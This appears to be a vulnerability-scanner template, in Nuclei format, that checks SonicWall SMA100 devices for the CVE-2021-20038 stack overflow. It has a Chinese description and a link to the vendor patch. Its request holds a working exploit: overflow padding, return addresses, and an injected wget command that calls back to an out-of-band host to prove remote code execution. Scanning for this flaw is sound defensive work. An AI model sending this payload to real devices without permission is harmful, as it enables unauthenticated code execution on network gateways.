id: CVE-2021-20038
info:
  name: SonicWall SMA100 Stack - Buffer Overflow/Remote Code Execution
  author:
  - l0ne1y
  description: |-
    Sonicwall SMA100 缓冲区错误漏洞
    Sonicwall SMA100是美国Sonicwall公司的一款安全访问网关设备。

    SonicWall SMA100 Apache httpd 服务器的 mod_cgi 模块环境变量中存在缓冲区错误漏洞，该漏洞允许未经身份验证的远程攻击者潜在地以设备中的nobody用户身份执行代码。此漏洞影响 SMA 200、210、400、410 和 500v 设备固件 10.2.0.8-37sv、10.2.1.1-19sv、10.2.1.2-24sv 和更早版本。
  severity: critical
  remediation: |2+

    官方修复建议：
    目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
    https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2021-0026

requests:
- matchers:
  - type: word
    part: interactsh_protocol
    words:
    - http
  - type: status
    status:
    - 200
  raw:
  - |
    GET /{{prefix_addr}}{{system_addr}};{wget,http://{{interactsh-url}}};{{prefix_addr}}{{system_addr}};{wget,http://{{interactsh-url}}};?{{repeat("A", 518)}} HTTP/1.1
    Host: {{Hostname}}
  attack: clusterbomb
  payloads:
    prefix_addr:
    - '%04%d7%7f%bf%18%d8%7f%bf%18%d8%7f%bf'
    system_addr:
    - '%08%b7%06%08'
    - '%64%b8%06%08'
